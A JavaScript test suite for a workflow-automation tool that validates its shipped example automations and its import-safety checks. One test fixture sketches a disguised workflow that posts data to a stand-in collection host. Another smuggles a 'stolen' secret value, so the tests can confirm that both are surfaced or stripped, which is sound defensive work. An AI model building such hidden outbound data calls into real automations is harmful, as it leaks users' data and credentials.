// The automations that ship are the first thing anybody sees. If one of them
// names a step that no longer exists, or a field that was renamed, a new
// install opens on something broken.
import test from 'node:test'
import assert from 'node:assert/strict'
import path from 'node:path'
import { readdir, readFile } from 'node:fs/promises'
import { fileURLToPath } from 'node:url'
import { loadNodes } from '../src/engine/registry.js'
import { loadIntegrations, nodesFor } from '../src/integrations/registry.js'
import { hasExpression, resolveValue, makeContext } from '../src/engine/expression.js'

const here = path.dirname(fileURLToPath(import.meta.url))
const dir = path.join(here, '../automations')

const code = await loadNodes({ builtinDir: path.join(here, '../src/nodes') })
const { integrations } = await loadIntegrations({ builtinDir: path.join(here, '../src/integrations/builtin') })
const nodes = new Map(code.nodes)
for (const spec of integrations.values()) for (const def of nodesFor(spec)) nodes.set(def.type, def)

const files = (await readdir(dir)).filter((f) => f.endsWith('.json')).sort()
const examples = []
for (const file of files) examples.push([file, JSON.parse(await readFile(path.join(dir, file), 'utf8'))])

test('there are examples, and they arrive switched off', () => {
  assert.ok(examples.length >= 8, `only ${examples.length} examples`)
  for (const [file, wf] of examples) {
    assert.notEqual(wf.active, true, `${file} ships switched on`)
    assert.ok(wf.name, `${file} has no name`)
    assert.ok(wf.notes, `${file} has no note saying what it does`)
  }
})

test('every step in every example exists, with fields that exist', () => {
  for (const [file, wf] of examples) {
    for (const node of wf.nodes) {
      const def = nodes.get(node.type)
      assert.ok(def, `${file} uses ${node.type}, which is not a step`)
      const known = new Set((def.params ?? []).map((p) => p.key))
      for (const key of Object.keys(node.params ?? {})) {
        assert.ok(known.has(key), `${file}: ${node.type} has no field called "${key}"`)
      }
      for (const param of def.params ?? []) {
        if (param.options?.length && node.params?.[param.key]) {
          const allowed = param.options.map((o) => o.value ?? o)
          assert.ok(allowed.includes(node.params[param.key]),
            `${file}: ${node.type}.${param.key} is "${node.params[param.key]}", which is not one of ${allowed.join(', ')}`)
        }
      }
    }
  }
})

test('every wire in every example joins two steps that are there', () => {
  for (const [file, wf] of examples) {
    const ids = new Set(wf.nodes.map((n) => n.id))
    for (const edge of wf.edges) {
      assert.ok(ids.has(edge.from), `${file} has a wire from a step that is not there`)
      assert.ok(ids.has(edge.to), `${file} has a wire to a step that is not there`)
      const from = nodes.get(wf.nodes.find((n) => n.id === edge.from).type)
      const ports = from.outputs?.length ? from.outputs : ['main']
      assert.ok(ports.includes(edge.fromPort), `${file}: ${edge.from} has no output called ${edge.fromPort}`)
    }
  }
})

test('every example has exactly one step that starts it', () => {
  for (const [file, wf] of examples) {
    const triggers = wf.nodes.filter((n) => nodes.get(n.type)?.category === 'trigger')
    assert.equal(triggers.length, 1, `${file} has ${triggers.length} steps that start it`)
  }
})

test('every expression in every example is valid javascript', () => {
  const ctx = makeContext({ item: { json: {} }, index: 0, items: [], creds: {} })
  for (const [file, wf] of examples) {
    for (const node of wf.nodes) {
      for (const [key, value] of Object.entries(node.params ?? {})) {
        if (!hasExpression(value)) continue
        try {
          resolveValue(value, ctx)
        } catch (err) {
          // reading a field that is not there at rest is fine; a syntax error is not
          assert.doesNotMatch(err.message, /is not valid/, `${file}: ${node.type}.${key} — ${err.message}`)
        }
      }
    }
  }
})

test('an example that names a key explains which key in its note', () => {
  for (const [file, wf] of examples) {
    const named = new Set()
    for (const node of wf.nodes) {
      const def = nodes.get(node.type)
      for (const param of def.params ?? []) {
        if (param.type === 'credential' && node.params?.[param.key]) named.add(node.params[param.key])
      }
    }
    for (const name of named) {
      assert.match(wf.notes, new RegExp(name.replace(/_/g, '.?')),
        `${file} uses the key "${name}" but its note never mentions it`)
    }
  }
})

test('a shared automation is read before it is trusted', async () => {
  const { derivePermissions, cleanWorkflow } = await import('../src/engine/permissions.js')
  const specs = new Map([...integrations].map(([id, spec]) => [id, spec]))

  const shared = {
    name: 'looks harmless',
    nodes: [
      { id: 'clock', type: 'core.schedule', params: { mode: 'every', every: 5, unit: 'minutes' } },
      { id: 'read', type: 'web3.balance', params: { chain: 'ethereum', address: 'vitalik.eth' } },
      { id: 'code', type: 'code.js', params: { code: 'return items' } },
      { id: 'post', type: 'discord.post', params: { credential: 'my_discord', content: 'hi' } },
      { id: 'call', type: 'net.http', params: { method: 'POST', url: 'https://somewhere-else.example.com/collect' } },
    ],
    edges: [
      { from: 'clock', to: 'read' }, { from: 'read', to: 'code' },
      { from: 'code', to: 'post' }, { from: 'post', to: 'call' },
    ],
  }

  const cleaned = cleanWorkflow(shared)
  const derived = derivePermissions(cleaned, { nodes, integrations: specs })

  // the quiet call to somebody else's server is on the screen before installing
  assert.ok(derived.hosts.includes('somewhere-else.example.com'))
  assert.ok(derived.runsCode, 'a code step has to be called out')
  assert.ok(derived.readsChain)
  assert.deepEqual(derived.credentials, ['my_discord'])
  assert.equal(derived.steps, 5)
})

test('an imported automation cannot carry a key value or a switched-on state', async () => {
  const { cleanWorkflow } = await import('../src/engine/permissions.js')
  const sneaky = cleanWorkflow({
    name: 'sneaky',
    active: true,
    installs: 999,
    nodes: [{ id: 'a', type: 'output.log', params: { message: 'hi' }, secretValues: { token: 'stolen' } }],
    edges: [],
  })
  assert.equal(sneaky.active, undefined, 'nothing arrives switched on')
  assert.equal(sneaky.nodes[0].secretValues, undefined, 'nothing outside the known shape survives')
  assert.deepEqual(Object.keys(sneaky.nodes[0]).sort(),
    ['id', 'name', 'onError', 'params', 'position', 'retries', 'retryWait', 'type'])
})
